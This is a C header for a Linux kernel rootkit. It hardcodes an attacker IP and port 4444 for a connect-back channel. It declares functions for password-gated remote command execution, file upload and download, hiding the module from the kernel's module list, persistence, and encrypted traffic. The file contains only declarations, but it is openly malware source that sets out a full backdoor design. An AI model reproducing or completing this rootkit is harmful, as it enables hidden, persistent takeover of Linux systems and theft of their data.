#ifndef ROOTKIT_H
#define ROOTKIT_H

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/socket.h>
#include <linux/kthread.h>
#include <net/sock.h>
#include <linux/inet.h>
#include <linux/uio.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/limits.h>
#include <linux/namei.h>
#include <linux/err.h>
#include <linux/stat.h>
#include <linux/kobject.h>
#include <linux/list.h>

// Configuration
#define IP_ATTACKER "192.168.1.95"
#define PORT_ATTACKER 4444
#define MAX_CMD_LEN 128
#define MAX_MSG_LEN 2048
#define OUTPUT_COMMAND_PATH "/tmp/rootkit_out.txt"
#define BASIC_HASH 590
#define END_OUTPUT "END_OUTPUT\n"
#define FILE_CHUNK_SIZE 4096
#define UPLOAD_MARKER "UPLOAD_START\n"
#define DOWNLOAD_MARKER "DOWNLOAD_START\n"
#define FILE_END_MARKER "FILE_END\n"

// Variables globales
extern struct socket *conn_socket;
extern struct task_struct *thread;
extern char current_dir[PATH_MAX];
extern struct list_head *prev_module;
extern short hidden;

// network.c
int connect_server(void);
void send_response(const char *msg);
void send_chunk_response(const char *data, size_t len);

// authentification.c
unsigned int basic_hash(const char *password);
int authenticated(struct socket *sock);
int authentication_loop(void);

// rootkitShell.c
int resolve_path(const char *base, const char *input, char *resolved, size_t max_len);
void command_cd(const char *new_dir, char *msg, size_t msglen);
void command_basic(const char *cmd);
void execute_and_respond(const char *cmd);

// load.c
int file_exists(const char *filepath);
void send_file(const char *filepath);
void receive_file(const char *filepath);

// hide.c
void hide_module(void);
void show_module(void);
void enable_advanced_hiding(void);
void disable_advanced_hiding(void);

// persistence.c
void set_persistence(void);

// encrypt.c
void send_encrypted_response(const char *msg);
void send_encrypted_chunk_response(const char *data, size_t len);
int receive_encrypted_data(char *buffer, size_t max_len);

// rootkit.c
void command_loop(void);
int connect_to_attacker(void *data);

#endif /* ROOTKIT_H */